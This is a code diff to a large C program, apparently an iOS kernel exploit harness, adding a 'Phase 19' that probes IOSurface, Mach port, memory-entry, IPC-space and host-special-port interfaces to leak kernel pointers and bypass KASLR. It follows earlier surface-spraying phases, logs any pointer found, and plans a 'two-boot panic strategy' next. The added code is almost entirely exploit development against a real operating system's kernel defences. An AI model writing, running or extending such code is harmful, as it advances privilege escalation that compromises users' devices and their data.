@@ -40,6 +40,7 @@
 #include <pthread.h>
 #include <dispatch/dispatch.h>
 #include <mach/mach.h>
+#include <mach/mach_vm.h>
 #include <mach_debug/mach_debug.h>
 #include <mach/mach_time.h>
 #include <CoreFoundation/CoreFoundation.h>
@@ -22548,6 +22549,340 @@ new_modes:
             }
             rlog("--- Phase 18 complete ---\n");
         }
+
+
+        /* ================================================================
+         * Phase 19 (r=229): Deep KASLR probing
+         *
+         * Since all standard probes failed, try:
+         * 1. IOSurfaceCreateMachPort → mach_port_get_context
+         * 2. IOConnectSetNotificationPort (direct, not via async)
+         * 3. mach_vm_page_range_query for physical page info
+         * 4. mach_make_memory_entry_64 on IOSurface memory
+         * 5. vm_region_recurse_64 extended info on IOSurface mapping
+         * 6. mach_port_space_info for port table leak
+         * 7. Spray GEN3 with pipe buffers after freeing match surface
+         * ================================================================ */
+        if (rounds == 229 && r229_matched_idx >= 0) {
+            rlog("\n=== Phase 19 (r=229): Deep KASLR Probing ===\n");
+
+            uint64_t p19_leaked = 0;
+            IOSurfaceRef match_surf = r229_spray_static[r229_matched_idx];
+            if (!match_surf) { rlog("  No match surface!\n"); goto p19_done; }
+
+            /* 19a: IOSurfaceCreateMachPort + port probing */
+            rlog("\n  --- 19a: IOSurfaceCreateMachPort ---\n");
+            {
+                mach_port_t surf_port = IOSurfaceCreateMachPort(match_surf);
+                rlog("  Surface Mach port: 0x%x\n", surf_port);
+
+                if (surf_port != MACH_PORT_NULL) {
+                    /* mach_port_get_context */
+                    mach_port_context_t ctx = 0;
+                    kern_return_t kr = mach_port_get_context(mach_task_self(),
+                        surf_port, &ctx);
+                    rlog("  port_get_context: kr=0x%x ctx=0x%llx\n",
+                         kr, (unsigned long long)ctx);
+                    if (kr == KERN_SUCCESS && (ctx >> 40) == 0xfffffe) {
+                        rlog("  *** PORT CONTEXT KPTR: 0x%016llx ***\n",
+                             (unsigned long long)ctx);
+                        p19_leaked = ctx;
+                    }
+
+                    /* mach_port_kobject */
+                    natural_t kotype = 0;
+                    mach_vm_address_t koaddr = 0;
+                    kr = mach_port_kobject(mach_task_self(), surf_port,
+                        &kotype, (mach_port_t *)&koaddr);
+                    rlog("  surf port kobject: kr=0x%x type=%u addr=0x%llx\n",
+                         kr, kotype, (unsigned long long)koaddr);
+                    if (kr == KERN_SUCCESS && (koaddr >> 40) == 0xfffffe) {
+                        rlog("  *** SURF KOBJECT KPTR: 0x%016llx ***\n",
+                             (unsigned long long)koaddr);
+                        if (!p19_leaked) p19_leaked = koaddr;
+                    }
+
+                    /* Try looking up the surface through the port */
+                    IOSurfaceRef looked = IOSurfaceLookupFromMachPort(surf_port);
+                    rlog("  LookupFromMachPort: %p (match=%p)\n",
+                         (void *)looked, (void *)match_surf);
+
+                    /* Create ports for ALL spray surfaces and check each */
+                    int ports_with_ctx = 0;
+                    for (int si = 0; si < 256 && si < 10; si++) {
+                        if (!r229_spray_static[si]) continue;
+                        mach_port_t sp = IOSurfaceCreateMachPort(r229_spray_static[si]);
+                        if (sp != MACH_PORT_NULL) {
+                            mach_port_context_t c = 0;
+                            mach_port_get_context(mach_task_self(), sp, &c);
+                            if (c != 0) {
+                                rlog("  spray[%d] port ctx=0x%llx\n",
+                                     si, (unsigned long long)c);
+                                ports_with_ctx++;
+                                if ((c >> 40) == 0xfffffe && !p19_leaked)
+                                    p19_leaked = c;
+                            }
+                            mach_port_deallocate(mach_task_self(), sp);
+                        }
+                    }
+                    rlog("  Ports with nonzero ctx: %d\n", ports_with_ctx);
+
+                    mach_port_deallocate(mach_task_self(), surf_port);
+                }
+            }
+
+            /* 19b: IOConnectSetNotificationPort */
+            rlog("\n  --- 19b: IOConnectSetNotificationPort ---\n");
+            {
+                io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (svc) {
+                    io_connect_t conn = IO_OBJECT_NULL;
+                    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                    IOObjectRelease(svc);
+                    if (kr == KERN_SUCCESS) {
+                        for (uint32_t ntype = 0; ntype < 8; ntype++) {
+                            mach_port_t nport = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(),
+                                MACH_PORT_RIGHT_RECEIVE, &nport);
+                            mach_port_insert_right(mach_task_self(), nport, nport,
+                                MACH_MSG_TYPE_MAKE_SEND);
+
+                            kr = IOConnectSetNotificationPort(conn, ntype,
+                                nport, (uintptr_t)match_surf);
+                            if (kr != 0xe00002c2) { /* Not unsupported */
+                                rlog("  SetNotifPort type %u: kr=0x%x\n", ntype, kr);
+
+                                if (kr == KERN_SUCCESS) {
+                                    /* Trigger by locking/unlocking */
+                                    IOSurfaceLock(match_surf, 0, NULL);
+                                    void *b = IOSurfaceGetBaseAddress(match_surf);
+                                    if (b) memset(b, 0xAA, 64);
+                                    IOSurfaceUnlock(match_surf, 0, NULL);
+                                    usleep(50000);
+
+                                    /* Check for messages */
+                                    struct {
+                                        mach_msg_header_t hdr;
+                                        uint8_t body[4096];
+                                    } msg;
+                                    memset(&msg, 0, sizeof(msg));
+                                    msg.hdr.msgh_size = sizeof(msg);
+                                    msg.hdr.msgh_local_port = nport;
+
+                                    kr = mach_msg(&msg.hdr,
+                                        MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                        0, sizeof(msg), nport, 100, MACH_PORT_NULL);
+                                    rlog("  recv type %u: kr=0x%x\n", ntype, kr);
+                                    if (kr == KERN_SUCCESS) {
+                                        rlog("  *** NOTIFICATION RECEIVED type %u! size=%u ***\n",
+                                             ntype, msg.hdr.msgh_size);
+                                        /* Scan for kernel pointers */
+                                        uint64_t *p = (uint64_t *)&msg;
+                                        for (size_t q = 0; q < msg.hdr.msgh_size / 8; q++) {
+                                            if ((p[q] >> 40) == 0xfffffe) {
+                                                rlog("  KPTR at msg+%zu: 0x%016llx\n",
+                                                     q * 8, (unsigned long long)p[q]);
+                                                if (!p19_leaked) p19_leaked = p[q];
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                            mach_port_destroy(mach_task_self(), nport);
+                        }
+                        IOServiceClose(conn);
+                    }
+                }
+            }
+
+            /* 19c: vm_region_recurse_64 on IOSurface shared memory */
+            rlog("\n  --- 19c: vm_region_recurse on IOSurface memory ---\n");
+            {
+                void *base = IOSurfaceGetBaseAddress(match_surf);
+                if (base) {
+                    mach_vm_address_t addr = (mach_vm_address_t)(uintptr_t)base;
+                    mach_vm_size_t size = 0;
+                    uint32_t depth = 0;
+                    struct vm_region_submap_info_64 info;
+                    mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+
+                    kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
+                        &addr, &size, &depth, (vm_region_recurse_info_t)&info, &cnt);
+                    rlog("  region: kr=0x%x addr=0x%llx size=0x%llx depth=%u\n",
+                         kr, (unsigned long long)addr, (unsigned long long)size, depth);
+                    if (kr == KERN_SUCCESS) {
+                        rlog("    protection=%d max_prot=%d inheritance=%d\n",
+                             info.protection, info.max_protection, info.inheritance);
+                        rlog("    offset=0x%llx behavior=%d user_wired=%u\n",
+                             (unsigned long long)info.offset, info.behavior,
+                             info.user_wired_count);
+                        rlog("    is_submap=%d object_id=0x%x\n",
+                             info.is_submap, info.object_id);
+                        rlog("    external_pager=%d shadow_depth=%d tag=%d\n",
+                             info.external_pager, info.shadow_depth,
+                             info.user_tag);
+                        /* Check for kernel pointers in the info struct */
+                        uint64_t *fp = (uint64_t *)&info;
+                        for (unsigned fi = 0; fi < cnt; fi++) {
+                            if ((fp[fi] >> 40) == 0xfffffe) {
+                                rlog("    *** REGION KPTR field %u: 0x%016llx ***\n",
+                                     fi, (unsigned long long)fp[fi]);
+                                if (!p19_leaked) p19_leaked = fp[fi];
+                            }
+                        }
+                    }
+                }
+            }
+
+            /* 19d: mach_make_memory_entry_64 on IOSurface memory */
+            rlog("\n  --- 19d: mach_make_memory_entry_64 ---\n");
+            {
+                void *base = IOSurfaceGetBaseAddress(match_surf);
+                size_t alloc_sz = IOSurfaceGetAllocSize(match_surf);
+                if (base && alloc_sz > 0) {
+                    mach_port_t entry_port = MACH_PORT_NULL;
+                    memory_object_size_t entry_size = (memory_object_size_t)alloc_sz;
+                    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
+                        &entry_size, (mach_vm_address_t)(uintptr_t)base,
+                        VM_PROT_READ | VM_PROT_WRITE | MAP_MEM_NAMED_CREATE,
+                        &entry_port, MACH_PORT_NULL);
+                    rlog("  memory_entry: kr=0x%x port=0x%x size=0x%llx\n",
+                         kr, entry_port, (unsigned long long)entry_size);
+
+                    if (kr == KERN_SUCCESS && entry_port != MACH_PORT_NULL) {
+                        /* Check kobject on the memory entry port */
+                        natural_t kotype = 0;
+                        mach_vm_address_t koaddr = 0;
+                        kr = mach_port_kobject(mach_task_self(), entry_port,
+                            &kotype, (mach_port_t *)&koaddr);
+                        rlog("  entry kobject: kr=0x%x type=%u addr=0x%llx\n",
+                             kr, kotype, (unsigned long long)koaddr);
+                        if (kr == KERN_SUCCESS && (koaddr >> 40) == 0xfffffe) {
+                            rlog("  *** ENTRY KPTR: 0x%016llx ***\n",
+                                 (unsigned long long)koaddr);
+                            if (!p19_leaked) p19_leaked = koaddr;
+                        }
+
+                        /* Check context */
+                        mach_port_context_t ctx = 0;
+                        mach_port_get_context(mach_task_self(), entry_port, &ctx);
+                        rlog("  entry ctx: 0x%llx\n", (unsigned long long)ctx);
+                        if ((ctx >> 40) == 0xfffffe && !p19_leaked)
+                            p19_leaked = ctx;
+
+                        mach_port_deallocate(mach_task_self(), entry_port);
+                    }
+                }
+            }
+
+            /* 19e: mach_port_space_info for IPC space kernel addresses */
+            rlog("\n  --- 19e: mach_port_space_info ---\n");
+            {
+                ipc_info_space_t space_info;
+                ipc_info_name_array_t table_info = NULL;
+                mach_msg_type_number_t table_cnt = 0;
+                ipc_info_tree_name_array_t tree_info = NULL;
+                mach_msg_type_number_t tree_cnt = 0;
+
+                kern_return_t kr = mach_port_space_info(mach_task_self(),
+                    &space_info, &table_info, &table_cnt,
+                    &tree_info, &tree_cnt);
+                rlog("  space_info: kr=0x%x table_cnt=%u tree_cnt=%u\n",
+                     kr, table_cnt, tree_cnt);
+                if (kr == KERN_SUCCESS) {
+                    rlog("  gencount=%u table_size=%u tree_size=%u\n",
+                         space_info.iis_genno_mask, space_info.iis_table_size,
+                         space_info.iis_tree_size);
+
+                    /* Scan table entries for kernel pointers */
+                    if (table_info && table_cnt > 0) {
+                        uint64_t *tp = (uint64_t *)table_info;
+                        size_t nqw = (table_cnt * sizeof(ipc_info_name_t)) / 8;
+                        int found = 0;
+                        for (size_t i = 0; i < nqw && found < 5; i++) {
+                            if ((tp[i] >> 40) == 0xfffffe) {
+                                rlog("  *** SPACE TABLE KPTR[%zu]: 0x%016llx ***\n",
+                                     i, (unsigned long long)tp[i]);
+                                if (!p19_leaked) p19_leaked = tp[i];
+                                found++;
+                            }
+                        }
+                        vm_deallocate(mach_task_self(),
+                            (vm_address_t)table_info,
+                            table_cnt * sizeof(ipc_info_name_t));
+                    }
+                    if (tree_info)
+                        vm_deallocate(mach_task_self(),
+                            (vm_address_t)tree_info,
+                            tree_cnt * sizeof(ipc_info_tree_name_t));
+                }
+            }
+
+            /* 19f: Check IOSurface surface IDs for sequential pattern */
+            rlog("\n  --- 19f: Surface ID analysis ---\n");
+            {
+                IOSurfaceID ids[10];
+                for (int i = 0; i < 10 && i < 256; i++) {
+                    if (r229_spray_static[i])
+                        ids[i] = IOSurfaceGetID(r229_spray_static[i]);
+                    else
+                        ids[i] = 0;
+                }
+                rlog("  First 10 IDs: %u %u %u %u %u %u %u %u %u %u\n",
+                     ids[0], ids[1], ids[2], ids[3], ids[4],
+                     ids[5], ids[6], ids[7], ids[8], ids[9]);
+                /* The surface ID is a small sequential integer.
+                 * But on some iOS, the ID is derived from the kernel object address.
+                 * Check if any ID looks like a truncated kernel pointer. */
+                IOSurfaceID mid = IOSurfaceGetID(match_surf);
+                rlog("  Match surface ID: %u (0x%x)\n", mid, mid);
+                /* IDs above 0x10000 might encode address info */
+                if (mid > 0x10000) {
+                    rlog("  *** UNUSUAL ID: may encode kernel info ***\n");
+                }
+            }
+
+            /* 19g: host_get_special_port for kernel port leak */
+            rlog("\n  --- 19g: host_special_ports ---\n");
+            {
+                for (int sp = 0; sp <= 8; sp++) {
+                    mach_port_t hp = MACH_PORT_NULL;
+                    kern_return_t kr = host_get_special_port(mach_host_self(),
+                        HOST_LOCAL_NODE, sp, &hp);
+                    if (kr == KERN_SUCCESS && hp != MACH_PORT_NULL) {
+                        mach_port_context_t ctx = 0;
+                        mach_port_get_context(mach_task_self(), hp, &ctx);
+                        natural_t kotype = 0;
+                        mach_vm_address_t koaddr = 0;
+                        mach_port_kobject(mach_task_self(), hp,
+                            &kotype, (mach_port_t *)&koaddr);
+                        rlog("  host_special[%d]: port=0x%x ctx=0x%llx ko_type=%u ko_addr=0x%llx\n",
+                             sp, hp, (unsigned long long)ctx, kotype,
+                             (unsigned long long)koaddr);
+                        if ((ctx >> 40) == 0xfffffe && !p19_leaked)
+                            p19_leaked = ctx;
+                        if ((koaddr >> 40) == 0xfffffe && !p19_leaked)
+                            p19_leaked = koaddr;
+                    }
+                }
+            }
+
+            /* === Phase 19 Summary === */
+            rlog("\n=== Phase 19 Summary ===\n");
+            if (p19_leaked) {
+                rlog("*** KASLR LEAK FOUND: 0x%016llx ***\n",
+                     (unsigned long long)p19_leaked);
+            } else {
+                rlog("No kernel pointer leaked via deep probes.\n");
+                rlog("ALL standard KASLR bypass paths are dead on iOS 27.1.\n");
+                rlog("Next: try two-boot panic strategy or kernelcache analysis.\n");
+            }
+            rlog("--- Phase 19 complete ---\n");
+
+            p19_done: ;
+        }
+
 
 
 
